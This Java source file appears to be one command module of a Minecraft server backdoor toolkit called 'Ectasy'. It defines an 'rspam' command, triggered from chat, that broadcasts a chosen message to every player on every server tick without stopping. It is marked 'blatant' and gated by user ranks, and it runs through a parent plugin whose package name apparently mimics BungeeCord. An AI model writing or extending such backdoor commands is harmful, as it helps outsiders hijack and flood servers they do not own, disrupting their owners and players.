package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.scheduler.BukkitRunnable;

@CommandInfo(
   name = "rspam",
   description = "Continuously spams a message in chat",
   blatant = true,
   rank = Rank.LITE
)
public class ChatSpamCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      String arg = String.join(" ", var3).replace("&", "§");
      new BukkitRunnable() {
         @Override
         public void run() {
            Bukkit.broadcastMessage(arg);
         }
      }.runTaskTimer(Ectasy.parentPlugin, 1L, 1L);
   }

   public ChatSpamCommand() {
   }
}
